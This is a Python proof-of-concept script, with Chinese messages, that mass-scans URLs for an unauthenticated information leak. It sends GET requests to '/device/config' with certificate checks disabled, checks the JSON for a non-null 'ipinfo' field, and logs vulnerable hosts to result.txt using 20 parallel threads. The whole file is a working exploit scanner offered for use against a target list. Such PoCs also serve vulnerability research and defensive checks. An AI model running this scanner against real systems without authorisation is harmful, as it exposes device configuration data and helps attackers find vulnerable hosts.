import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Connection": "keep-alive",
    }   
def poc(url):
    payload = '/device/config'
    target = url+payload
    try:
        rsp = requests.get(url=target,headers=headers,verify=False)
        if rsp.status_code == 200:
            res_url = json.loads(rsp.text)
            if res_url['ipinfo']!=None:
                print(f"[+]{url}存在信息泄露")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在信息泄露")
        else:
            print(f"[-]{url}不存在信息泄露")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()